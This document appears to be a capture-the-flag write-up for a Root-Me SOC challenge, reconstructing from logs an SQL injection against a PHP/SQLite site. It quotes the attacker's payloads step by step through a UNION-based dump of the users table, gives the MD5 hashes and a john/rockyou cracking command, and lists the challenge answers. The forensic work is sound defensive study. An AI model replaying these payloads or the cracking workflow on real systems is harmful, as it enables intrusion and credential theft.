# SOC Web — Injection SQL (Root-Me Pro, SOC, Easy, 200pts)

"SQLite Basics" — *Barely online and already under attack! Find out what happened on this server
before the company put production data on it.*

Target: `super-builder.urban` (10.33.77.98), Apache + PHP/PDO + SQLite. Date: 2025-06-13.

## Access

Same OpenSearch Dashboards method as the DCSync challenge — token → cookies → console proxy.

```bash
TOKEN=$(cat files/token.txt)
curl -sS -c files/cookies.txt -o /dev/null "https://soc.challenges.root-me.pro/?token=$TOKEN"
curl -sS -b files/cookies.txt -H 'osd-xsrf: true' -H 'Content-Type: application/json' \
  -X POST "https://soc.challenges.root-me.pro/api/console/proxy?path=<IDX>/_search&method=POST" \
  -d '{"size":1000,"query":{"match_all":{}},"sort":[{"@timestamp":"asc"}]}'
```

Indices (from `/api/saved_objects/_find?type=index-pattern`):
- `index-63f5ed0b4d34-apache` — 48 docs (42 access w/ `clientip`, **6 `apache-error` PHP errors with no `clientip`** — they use `client` instead, `ip:port`)
- `index-63f5ed0b4d34-audit` — 42 docs, ModSecurity, **full request + response bodies**

The audit index is the gold mine: it contains the rendered response body, so you can read exactly
what the injection returned.

## Attacker

Only **one** client IP in the whole dataset: **`163.172.93.114`**. No pivoting needed.

## Attack chain (all times UTC)

| Time | Action |
|------|--------|
| 09:43:22 | Recon, `GET /` + static assets, Firefox 128 UA |
| 09:43:28 | `GET /admin/` — finds login |
| 09:43:32–44 | 3 x `POST /admin/` → **401**: `admin/admin`, `admin/password`, `admin/super-builder2006` (manual guessing, gives up) |
| 09:44:07 | `?search=l33t'-` → no change (param not used) |
| 09:44:13 | `?language=l33t'-` → no change |
| 09:44:15 | **`?name=l33t'-` → PHP fatal error** — injectable param found |
| 09:44:30–33 | `?name=` / `?name=a` — baseline responses |
| 09:45:14 | `?name=a' or 1=1--` → all posts returned (TRUE) |
| 09:45:19 | `?name=a' or 1=2--` → nothing (FALSE) — boolean injection confirmed |
| 09:45:29 | `union select null--` → error: column count mismatch |
| 09:45:32 | `union select null,null--` → error |
| 09:45:37 | `union select null,null,null--` → **works, 3 columns** |
| 09:45:53 | `@@version` → `unrecognized token "@"` (not MySQL/MSSQL) |
| 09:46:05 | `version()` → `no such function` (not PostgreSQL) |
| 09:46:11 | `sqlite_version()` → **`3.40.1`** — SQLite confirmed |
| 09:49:01 | `tbl_name FROM sqlite_master WHERE type='table'` → **`posts`, `sqlite_sequence`, `users`** |
| 09:49:16 | `sql FROM sqlite_master WHERE name='users'` (no comment → error) |
| 09:49:19 | same **with `--`** → schema: `CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT, creation_date date TIMESTAMP DEFAULT (datetime('now','utc')))` |
| 09:49:40 | **`?name=a' union select null,username,password FROM users --` → full credential dump** |
| 09:50:35 | `GET /admin/` |
| 09:50:39 | **`POST /admin/` `username=admin&password=Password1_` → 200 — successful login** |

## Exfiltrated credentials (MD5)

| User | Hash |
|------|------|
| admin | `4933f814312b2ab04975d094f2b98ba7` |
| john | `232b22bd980d065d15b164d07e49e0ef` |
| steve | `0b0c1fb33c93c716d5011f489cbcffd3` |
| thomas | `f250b2cfed78b207143e442e32e59a2f` |

Verified locally: `md5("Password1_") == 4933f814312b2ab04975d094f2b98ba7` → the attacker cracked
admin's unsalted MD5 offline (~2 min gap between dump at 09:49:40 and login at 09:50:39) and
authenticated for real.

## Vulnerability

`/var/www/html/index.php:10` — the `name` GET parameter is concatenated straight into a
`PDO->query()` call. No prepared statement, and PHP errors are rendered to the client, which
handed the attacker the DBMS type and column-count feedback for free.

Passwords stored as **unsalted MD5**, so the dump was trivially crackable.

## Answers

- **Step 1 — attacker IP: `163.172.93.114`**
- **Step 2 — "number of server responses containing a body": `4`** ✅

  **The wording is misleading.** It does NOT mean the response body. The answer is the number of
  transactions carrying a **`request.body`** — the 4 `POST /admin/` requests. In Discover:
  filter `request.body` → *exists* → 4.

  Wrong answers burned before getting there, and why each was tempting:

  | Interpretation | Count | Result |
  |---|---|---|
  | `exists: response.body` (non-empty body) | 27 | ✗ |
  | body contains HTML `<body>` tag (`query_string: body`) | 20 | ✗ |
  | all audit docs (every response object has a `body` key) | 42 | ✗ |
  | all responses except the single 304 | 41 | ✗ |
  | **`exists: request.body` — the 4 POSTs** | **4** | ✅ |

  Data facts either way: all 42 audit docs have a `response.body` key but 15 hold `""`; an empty
  string yields no tokens so `exists` reports 27. `Content-Type: text/html` is exactly 27 —
  ModSecurity only logged bodies for text/html. Only one index matches each wildcard
  (`index-*-audit` = 42, `index-*-apache` = 48 = 42 access + 6 php error), so nothing was hidden.

- **Step 3 — plaintext password of `steve`: `donaldduck`** ✅
  `md5("donaldduck") = 0b0c1fb33c93c716d5011f489cbcffd3` (verified).
  Cracked instantly with `john --format=raw-md5 --fork=4 --wordlist=rockyou.txt`.
  Same run recovered `admin:Password1_`, which matches the password used in the successful
  `POST /admin/` at 09:50:39 — independent confirmation of the attacker's offline cracking step.
  `john` and `thomas` did not fall to rockyou (not required).

  Env gotcha: `rockyou.txt` is **not** pre-extracted on this VM (only `rockyou.txt.gz`), and `sudo`
  prompts for a password from a non-TTY context. Extracted a copy to the scratchpad instead.
- Step 3/4 (pending): likely candidates — injectable param `name`; DBMS `SQLite` / version `3.40.1`;
  table `users`; admin password `Password1_`; compromise time `09:50:39`

## Files

- `files/token.txt`, `files/cookies.txt`
- `files/apache.json` — 48 access + error events
- `files/audit.json` — 42 ModSecurity transactions with bodies
